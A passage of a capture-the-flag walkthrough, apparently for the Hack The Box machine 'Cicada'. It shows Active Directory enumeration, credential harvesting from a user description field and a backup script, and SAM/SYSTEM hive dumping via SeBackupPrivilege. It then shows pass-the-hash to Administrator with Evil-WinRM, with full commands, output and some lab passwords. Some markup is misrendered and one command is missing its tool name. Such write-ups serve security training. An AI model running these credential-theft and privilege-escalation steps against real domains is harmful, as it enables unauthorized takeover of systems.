+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:&lt;REDACTED&gt;   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        C$                              Default share  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        DEV                               
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        HR              READ              
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>Looks like there are no interesting share permissions since it can only read HR files like the guest user.</p><p>We could try enumerating for domain users using Netexec again by using the <code>--users</code> flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ nxc smb cicada.htb -u &#39;michael.wrightson&#39; -p &#39;&lt;REDACTED&gt;&#39; --users   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                                     
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain                                                                              
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain                                                                            
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account                                                                                             
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1          
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1          
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0          
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                 
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0          
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
+</span></span></code></pre></div><p>From the output above, we can see that the <code>--users</code> enumeration was successful after authenticating with valid credentials.</p><p>One thing stands out immediately</p><p>There is a <strong>description field</strong> for each user… and we have one naughty user who stored their <strong>PLAINTEXT password</strong> inside the description field:</p><p><code>david.orelious ... Description: Just in case I forget my password is &lt;REDACTED></code></p><p>This is a <strong>VERY BAD practice</strong>, especially in a company domain environment.</p><p>Storing credentials in the description field is extremely dangerous because:</p><ul><li>Any authenticated domain user can often read it.</li><li>Attackers can harvest it during simple enumeration.</li><li>It enables easy lateral movement.</li><li>It may lead to privilege escalation if the account has higher privileges.</li></ul><p>This is not just bad hygiene… this is basically giving attackers a free key!</p><h3 id=part-iii-initialfoothold>PART III: Initial Foothold</h3><p>By using david.orelious, let’s try enumerating once again for shares as usual.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ nxc smb cicada.htb -u &#39;david.orelious&#39; -p &#39;PASSWORD&#39; --shares  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:&lt;REDACTED&gt;  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        C$                              Default share  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        DEV             READ              
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        HR              READ              
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>From the output above, looks like there is another interesting file share permissions david.orelious have which is the <code>DEV</code> shares.</p><p>Let’s use smbclient tool once again to enumerate on the dev shares.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ smbclient //cicada.htb/DEV -U &#39;david.orelious%PASSWORD&#39;                                                  
+</span></span><span style=display:flex><span>Try &#34;help&#34; to get a list of possible commands.  
+</span></span><span style=display:flex><span>smb: \&gt; ls  
+</span></span><span style=display:flex><span>  .                                   D        0  Thu Mar 14 20:31:39 2024  
+</span></span><span style=display:flex><span>  ..                                  D        0  Thu Mar 14 20:21:29 2024  
+</span></span><span style=display:flex><span>  Backup_script.ps1                   A      601  Thu Aug 29 01:28:22 2024
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                4168447 blocks of size 4096. 481536 blocks available  
+</span></span><span style=display:flex><span>smb: \&gt; get Backup_script.ps1  
+</span></span><span style=display:flex><span>getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
+</span></span></code></pre></div><p>What we did above is we used <code>ls</code> to list all the files available in that smb share, and it looks like there is a <code>Backup_script.ps1</code> file which is JUICY.</p><p>We downloaded the script using the <code>get</code> command back to our machine.</p><p>From our machine, let’s use <code>cat backup_script.ps1</code> to read the script contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ cat Backup_script.ps1     
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$sourceDirectory = &#34;C:\smb&#34;  
+</span></span><span style=display:flex><span>$destinationDirectory = &#34;D:\Backup&#34;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$username = &#34;emily.oscars&#34;  
+</span></span><span style=display:flex><span>$password = ConvertTo-SecureString &#34;&lt;REDACTED&gt;&#34; -AsPlainText -Force  
+</span></span><span style=display:flex><span>$credentials = New-Object System.Management.Automation.PSCredential($username, $password)  
+</span></span><span style=display:flex><span>$dateStamp = Get-Date -Format &#34;yyyyMMdd_HHmmss&#34;  
+</span></span><span style=display:flex><span>$backupFileName = &#34;smb_backup_$dateStamp.zip&#34;  
+</span></span><span style=display:flex><span>$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName  
+</span></span><span style=display:flex><span>Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath  
+</span></span><span style=display:flex><span>Write-Host &#34;Backup completed successfully. Backup file saved to: $backupFilePath&#34;
+</span></span></code></pre></div><p>Hmm! It looks like there is another user with their password exposed directly inside the script!</p><p>Another finding… and potentially another user unlocked</p><p>The script contains hardcoded credentials for the user <code>emily.oscars</code>, and even though the password is converted to a SecureString, it is still written in <strong>plain text</strong> inside the script.</p><p>This is a <strong>critical security issue</strong> because:</p><ul><li>Anyone who can read this script can recover the password.</li><li>Source code repositories often leak these kinds of credentials.</li><li>Backup scripts are commonly overlooked during security reviews.</li><li>If this account has elevated privileges, this could lead to privilege escalation.</li></ul><p>But before celebrating too much, we still need to verify whether the credentials are valid and not outdated.</p><p>Never assume — always validate.</p><p>![[Pasted image 20260223143556.png]]</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>
+</span></span><span style=display:flex><span>From the Netexec output, it looks like the credentials is valid <span style=color:#f92672>and</span> <span style=color:#960050;background-color:#1e0010>`</span>emily<span style=color:#f92672>.</span>oscars<span style=color:#960050;background-color:#1e0010>`</span> have a READ permissions on the ADMIN share<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>We are going to use another important <span style=color:#66d9ef>tool</span> <span style=color:#f92672>in</span> Active <span style=color:#a6e22e>Directory</span> testing which is the <span style=color:#f92672>**</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>.**</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#### What is Evil-WinRM?</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>**</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>**</span> is a <span style=color:#66d9ef>tool</span> used <span style=color:#f92672>in</span> penetration testing to get a remote PowerShell session on a Windows machine using the WinRM service<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>It usually works over:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>-</span> <span style=color:#f92672>**</span>Port <span style=color:#ae81ff>5985</span> (HTTP)<span style=color:#f92672>**</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>-</span> <span style=color:#f92672>**</span>Port <span style=color:#ae81ff>5986</span> (HTTPS)<span style=color:#f92672>**</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>To use it, you need <span style=color:#f92672>**</span>valid credentials <span style=color:#f92672>or</span> a hash<span style=color:#f92672>**.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>In simple terms:  
+</span></span><span style=display:flex><span> If you have working credentials, Evil<span style=color:#f92672>-</span>WinRM lets you log into a Windows machine remotely <span style=color:#f92672>and</span> execute commands<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>⚠️</span> It should only be used <span style=color:#f92672>in</span> environments where you have proper authorization<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>We will use the command flags
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span>i<span style=color:#960050;background-color:#1e0010>`</span> to specify <span style=color:#66d9ef>for</span> the domain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span>u<span style=color:#960050;background-color:#1e0010>`</span> <span style=color:#66d9ef>for</span> the username <span style=color:#f92672>and</span> <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span>p<span style=color:#960050;background-color:#1e0010>`</span> <span style=color:#66d9ef>for</span> the password<span style=color:#f92672>.</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#f92672>$</span> evil<span style=color:#f92672>-</span>winrm <span style=color:#f92672>-</span>i cicada<span style=color:#f92672>.</span>htb <span style=color:#f92672>-</span>u <span style=color:#e6db74>&#39;emily.oscars&#39;</span>  <span style=color:#f92672>-</span>p <span style=color:#e6db74>&#39;Q!3@Lp#M6b*7t*Vt&#39;</span>  
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Evil<span style=color:#f92672>-</span>WinRM shell v3<span style=color:#f92672>.</span><span style=color:#ae81ff>7</span>
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style=color:#960050;background-color:#1e0010>`</span>quoting_detection_proc<span style=color:#e6db74>&#39; for module Reline</span>
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Data: For more information, check Evil<span style=color:#f92672>-</span>WinRM GitHub: https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>Hackplayers<span style=color:#f92672>/</span>evil<span style=color:#f92672>-</span>winrm<span style=color:#75715e>#Remote-path-completion</span>
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>*</span> PS C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA\Documents<span style=color:#f92672>&gt;</span> ls
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>*</span> PS C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA\Documents<span style=color:#f92672>&gt;</span> cd <span style=color:#f92672>..</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>*</span> PS C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA<span style=color:#f92672>&gt;</span> ls
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Directory</span>: C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                 LastWriteTime         Length Name
+</span></span><span style=display:flex><span><span style=color:#f92672>----</span>                 <span style=color:#f92672>-------------</span>         <span style=color:#f92672>------</span> <span style=color:#f92672>----</span>
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>         <span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>28</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span>  <span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>32</span> AM                Desktop
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>         <span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>22</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span>   <span style=color:#ae81ff>2</span>:<span style=color:#ae81ff>22</span> PM                Documents
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Downloads
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Favorites
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Links
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Music
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Pictures
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-----</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Saved Games
+</span></span><span style=display:flex><span>d<span style=color:#f92672>-</span>r<span style=color:#f92672>---</span>          <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2021</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>20</span> AM                Videos
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>*</span> PS C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA<span style=color:#f92672>&gt;</span> cd Desktop
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>*</span> PS C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA\Desktop<span style=color:#f92672>&gt;</span> ls
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Directory</span>: C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA\Desktop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                 LastWriteTime         Length Name
+</span></span><span style=display:flex><span><span style=color:#f92672>----</span>                 <span style=color:#f92672>-------------</span>         <span style=color:#f92672>------</span> <span style=color:#f92672>----</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>-</span>ar<span style=color:#f92672>---</span>         <span style=color:#ae81ff>2</span><span style=color:#f92672>/</span><span style=color:#ae81ff>17</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2026</span>   <span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>48</span> PM             <span style=color:#ae81ff>34</span> user<span style=color:#f92672>.</span>txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>Evil<span style=color:#f92672>-</span>WinRM<span style=color:#f92672>*</span> PS C:\Users\emily<span style=color:#f92672>.</span>oscars<span style=color:#f92672>.</span>CICADA\Desktop<span style=color:#f92672>&gt;</span> type user<span style=color:#f92672>.</span>txt
+</span></span><span style=display:flex><span>USER <span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>We used:</p><ul><li><code>cd ..</code> → to move one directory back</li><li><code>ls</code> → to list files and folders</li></ul><p>This is part of basic <strong>post-exploitation enumeration</strong>. Once we gain access, we start exploring the system to understand:</p><ul><li>Where we are</li><li>What files exist</li><li>What permissions we have</li><li>And what we can access next</li></ul><p>At this point, we have confirmed that the credentials for <code>emily.oscars</code> are valid and that we have interactive access to the machine.</p><p>We got the first flag in the <code>Desktop</code> directory which means this user is compromised.</p><h3 id=part-iv-privilege-escalation>PART IV: Privilege Escalation</h3><p>As Penetration Testers, we should always look for potential <strong>privilege escalation</strong>, because this is the most dangerous phase of an attack.</p><p>If an attacker manages to gain <strong>Administrator access</strong>, it can be game over for the Domain.</p><p>With elevated privileges, an attacker can:</p><ul><li>Dump credentials from memory</li><li>Access sensitive files and databases</li><li>Modify Group Policy</li><li>Create new domain admin accounts</li><li>Disable security tools</li><li>Move laterally across the network</li><li>Take full control over the Domain Controller</li></ul><p>In an Active Directory environment, if an attacker compromises a <strong>Domain Admin</strong> account, they essentially control the entire domain infrastructure.</p><p>That’s why privilege escalation is not just “nice to have” during a pentest — it’s one of the most critical impact demonstrations you can show in a real-world engagement.</p><p>From here, we check Emily’s privileges using:</p><p><code>whoami /priv</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; whoami /priv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PRIVILEGES INFORMATION  
+</span></span><span style=display:flex><span>----------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Privilege Name                Description                    State  
+</span></span><span style=display:flex><span>============================= ============================== =======  
+</span></span><span style=display:flex><span>SeBackupPrivilege             Back up files and directories  Enabled  
+</span></span><span style=display:flex><span>SeRestorePrivilege            Restore files and directories  Enabled  
+</span></span><span style=display:flex><span>SeShutdownPrivilege           Shut down the system           Enabled  
+</span></span><span style=display:flex><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
+</span></span><span style=display:flex><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span></code></pre></div><p>We can see several privileges enabled, but one stands out</p><p><code>**SeBackupPrivilege**</code></p><p>This privilege allows a user to <strong>read any file on the system</strong>, even if they normally don’t have permission to access it.</p><p>It was created for backup purposes, but attackers can abuse it.</p><p>In simple words:</p><p>Even if a file says “Access Denied” <code>SeBackupPrivilege</code> might let us read it anyway .</p><p>This is dangerous because it can allow us to access sensitive system files like:</p><ul><li><code>HKLM\SAM</code></li><li><code>HKLM\SYSTEM</code></li><li><code>HKLM\SECURITY</code></li></ul><p>These contain important information such as password hashes.</p><p>If this machine is very important (like a Domain Controller), abusing this privilege could lead to full system compromise.</p><p>This is why checking privileges after getting a shell is <strong>very important</strong>.</p><h4 id=extracting-the-sam-system-andsecurity>Extracting the SAM, SYSTEM, and SECURITY</h4><p>What we’ll do now is <strong>extract the SAM, SYSTEM, and SECURITY files</strong> using the <code>SeBackupPrivilege</code>.</p><p>Since this privilege lets us <strong>bypass normal file permissions</strong>, we can read these sensitive system files even if we wouldn’t normally have access.</p><p>By dumping these files, we can later try to recover passwords offline.</p><p>This is a perfect example of how a seemingly “backup-only” privilege can be abused for <strong>privilege escalation</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; reg save hklm\sam sam  
+</span></span><span style=display:flex><span>The operation completed successfully.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; reg save hklm\system system  
+</span></span><span style=display:flex><span>The operation completed successfully.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; ls  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:\Users\emily.oscars.CICADA\Desktop  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>After downloading it to our attack machine, we will use the tool <code>impacket-secretsdump</code>to dump the hashes of the users.</p><p>By dumping these hashes, we can perform a <strong>Pass-The-Hash</strong> Attack within the users.</p><blockquote><p><strong>What is Pass-The-Hash??</strong><br>A <strong>Pass-the-Hash (PtH) attack</strong> is a technique where an attacker uses a hashed version of a password to authenticate to a system without needing to decrypt it.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ -sam sam -system system local  
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620  
+</span></span><span style=display:flex><span>[*]   
+</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED:::  
+</span></span><span style=display:flex><span>Guest:501:&lt;REDACTED&gt;:::  
+</span></span><span style=display:flex><span>DefaultAccount:503:&lt;REDACTED&gt;:&lt;REDACTED&gt;:::  
+</span></span><span style=display:flex><span>[*] Cleaning up...
+</span></span></code></pre></div><p>This command above takes the <strong>SAM</strong> and <strong>SYSTEM</strong> files you extracted, decrypts the password hashes, and prints them out.</p><p>It’s one of the first steps in <strong>post-exploitation</strong> to find usable passwords or escalate privileges.</p><h4 id=this-opens-the-door-for-privilege-escalation>This opens the door for privilege escalation!!</h4><p>We now have the <strong>hash of the Administrator account</strong>, which we can use for a <strong>Pass-The-Hash (PtH) attack</strong>.</p><p>As I mentioned earlier, if PtH works, it’s basically <strong>game over,</strong> we could gain <strong>full administrative privileges</strong> on the machine, and potentially the domain.</p><p>To do this, we’ll use <strong>Evil-WinRM</strong> again, but this time with the <code>-H</code> flag to pass the hash instead of a password:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ evil-winrm -i cicada.htb -u &#39;Administrator&#39; -H &#39;HASH&#39;
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Evil-WinRM shell v3.7
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ls
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:\Users\Administrator\Documents
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                 LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                 -------------         ------ ----
+</span></span><span style=display:flex><span>d-----         3/14/2024  10:20 PM                WindowsPowerShell
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:\Users\Administrator\Desktop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                 LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                 -------------         ------ ----
+</span></span><span style=display:flex><span>-ar---         2/17/2026   1:48 PM             34 root.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
